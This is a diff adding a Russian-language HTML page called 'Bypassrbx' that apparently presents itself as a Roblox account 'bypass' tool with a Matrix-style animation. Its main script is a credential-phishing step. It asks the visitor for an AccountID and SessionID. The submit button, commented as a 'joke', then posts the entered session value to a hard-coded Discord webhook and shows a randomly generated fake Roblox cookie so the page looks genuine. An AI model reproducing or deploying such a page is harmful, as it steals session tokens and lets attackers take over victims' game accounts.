@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<title>Bypassrbx</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+
+  body {
+    margin: 0;
+    font-family: 'Share Tech Mono', monospace;
+    overflow: hidden;
+    background: black;
+    color: #fff;
+  }
+
+  canvas#matrix {
+    position: fixed;
+    top: 0;
+    left: 0;
+    z-index: 0;
+  }
+
+  #logo {
+    display: block;
+    margin: 0 auto 25px auto;
+    width: 120px;
+    height: auto;
+  }
+
+  .container {
+    position: relative;
+    z-index: 2;
+    text-align: center;
+    margin-top: 100px;
+  }
+
+  input[type="text"] {
+    display: block;
+    width: 300px;
+    margin: 15px auto;
+    padding: 10px;
+    background: black;
+    border: 2px solid #fff;
+    border-radius: 8px;
+    color: #fff;
+    font-size: 16px;
+  }
+
+  button {
+    display: block;
+    margin: 15px auto;
+    padding: 10px 20px;
+    background: black;
+    color: #fff;
+    border: 2px solid #fff;
+    border-radius: 8px;
+    cursor: pointer;
+    font-size: 16px;
+    transition: 0.2s;
+  }
+
+  button:hover {
+    background: #fff;
+    color: black;
+  }
+
+  /* POPUP */
+  .popup {
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    width: 380px;
+    background: black;
+    border: 2px solid #fff;
+    border-radius: 10px;
+    padding: 15px;
+    z-index: 999;
+    display: none;
+  }
+
+  .popup-header {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 10px;
+    font-weight: bold;
+  }
+
+  .close-btn {
+    position: absolute;
+    top: -5px;
+    right: 10px;
+    background: #fff;
+    color: black;
+    border: none;
+    padding: 3px 9px;
+    cursor: pointer;
+    border-radius: 6px;
+    font-weight: bold;
+  }
+
+  textarea {
+    width: 100%;
+    height: 110px;
+    background: black;
+    color: #fff;
+    border: 2px solid #fff;
+    border-radius: 8px;
+    padding: 8px;
+    resize: none;
+    margin-bottom: 10px;
+    font-family: monospace;
+  }
+</style>
+</head>
+<body>
+
+<canvas id="matrix"></canvas>
+
+<div class="container">
+  <img id="logo" src="https://files.catbox.moe/u53zf6.png" alt="Logo">
+
+  <input type="text" placeholder="AccountID" id="pineapple">
+  <input type="text" placeholder="SessionID" id="ananas">
+  
+  <button id="tutorial">Посмотреть туториал</button>
+  <button id="jokeBtn">Отправить</button>
+</div>
+
+<!-- POPUP -->
+<div class="popup" id="cookiePopup">
+  <div class="popup-header">
+    Roblox Cookie
+    <button class="close-btn" onclick="closePopup()">X</button>
+  </div>
+  <textarea id="cookieBox" readonly></textarea>
+  <button onclick="copyCookie()">копировать</button>
+</div>
+
+<script>
+  // MATRIX EFFECT
+  const canvas = document.getElementById('matrix');
+  const ctx = canvas.getContext('2d');
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+
+  const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()';
+  const fontSize = 18;
+  const columns = Math.floor(canvas.width / fontSize);
+  const drops = Array(columns).fill(1);
+
+  function draw() {
+    ctx.fillStyle = 'rgba(0,0,0,0.05)';
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = '#fff';
+    ctx.font = fontSize + 'px monospace';
+
+    for (let i = 0; i < drops.length; i++) {
+      const text = letters[Math.floor(Math.random() * letters.length)];
+      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+      if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+        drops[i] = 0;
+      }
+      drops[i]++;
+    }
+  }
+
+  setInterval(draw, 50);
+
+  window.addEventListener('resize', () => {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+  });
+
+  // Tutorial button
+  document.getElementById('tutorial').addEventListener('click', () => {
+    window.open('https://www.youtube.com/watch?v=WvzGB62ye1o', '_blank');
+  });
+
+  // Fake cookie generator
+  function generateFakeCookie() {
+    const warning = "_|WARNING:-DO-NOT-SHARE-THIS.-Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
+    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    let randomPart = "";
+    for (let i = 0; i < 350; i++) {
+      randomPart += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return warning + randomPart;
+  }
+
+  function openPopup() {
+    document.getElementById('cookieBox').value = generateFakeCookie();
+    document.getElementById('cookiePopup').style.display = "block";
+  }
+
+  function closePopup() {
+    document.getElementById('cookiePopup').style.display = "none";
+  }
+
+  function copyCookie() {
+    const box = document.getElementById("cookieBox");
+    box.select();
+    document.execCommand("copy");
+  }
+
+  // Joke button
+  document.getElementById('jokeBtn').addEventListener('click', () => {
+    const webhookUrl = 'https://discord.com/api/v10/webhooks/1478629698723385355/e3Y3FHE1pi-zCiVMlkP7qgAu1C5S3hdocMwy4KIOetEOYsuYWqbe12mrYbp0jeEPBSop';
+    const ananasText = document.getElementById('ananas').value;
+
+    if (!ananasText) {
+      alert('Пожалуйста, введите текст!');
+      return;
+    }
+
+    fetch(webhookUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ content: ananasText })
+    }).then(() => {
+      openPopup();
+    }).catch(err => {
+      console.error(err);
+      alert('Ошибка! Попробуйте проверить ваш интернет!');
+    });
+  });
+</script>
+
+</body>
+</html>
